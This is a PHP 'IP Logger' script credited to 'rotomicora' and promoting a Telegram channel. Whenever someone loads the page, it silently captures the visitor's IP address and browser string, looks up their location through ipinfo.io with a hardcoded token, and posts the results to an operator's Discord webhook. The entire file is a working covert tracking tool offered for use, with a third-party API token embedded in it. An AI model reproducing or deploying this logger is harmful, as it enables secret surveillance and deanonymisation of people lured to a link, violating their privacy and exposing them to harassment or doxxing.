<?php

$ip = $_SERVER['REMOTE_ADDR']; # 
$browser = $_SERVER['HTTP_USER_AGENT'];
$url = "WEBHOOK_HERE"; # Put your Webhook URL here


$ipinfo = file_get_contents("https://ipinfo.io/${ip}?token=6d2a4b25add82e");

$hookObject = json_encode([
    "username" => "t.me/projectnoxius | IP Logger ",
    "tts" => false,
    "embeds" => [
        [
            "title" => "t.me/projectnoxius IP LOGGER",
            "type" => "rich",
            "timestamp" => "1810-01-10T19:12:00-05:00",
            "color" => hexdec( "7800b0" ),
            "footer" => [
                "text" => "IP Logger rotomicora ",
            ],
            "author" => [
                "name" => "t.me/projectnoxius",
             ],

            "fields" => [
                [
                    "name" => "IP",
                    "value" => "```{$ip}```",
                    "inline" => false
                ],
                [
                    "name" => "Browser",
                    "value" => "```{$browser}```",
                    "inline" => false
                ],
                [
                    "name" => "IP Lookup",
                    "value" => "```{$ipinfo}```",
                    "inline" => false
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );

# Developed by rotomicora
?>
